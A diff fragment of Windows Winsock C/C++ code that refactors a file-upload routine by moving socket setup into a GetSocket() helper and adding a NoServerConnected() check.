@@ -66,15 +66,14 @@ string getHeader(int bodysize)
 }
 
 
-
-BOOL UploadFile(LPCWSTR filepath, LPCWSTR filename)
+SOCKET GetSocket() 
 {
     //Setup Connection
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        return FALSE;
+        return NULL;
     }
-    
+
     //socket() and connect()
     SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     struct hostent *host;
@@ -84,6 +83,20 @@ BOOL UploadFile(LPCWSTR filepath, LPCWSTR filename)
     SockAddr.sin_family = AF_INET;
     SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
     if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0){
+        return NULL;
+    }
+
+    return Socket;
+}
+
+BOOL NoServerConnected() {
+    return GetSocket() == NULL;
+}
+
+BOOL UploadFile(LPCWSTR filepath, LPCWSTR filename)
+{
+    SOCKET Socket = GetSocket();
+    if (Socket == NULL) {
         return FALSE;
     }
 
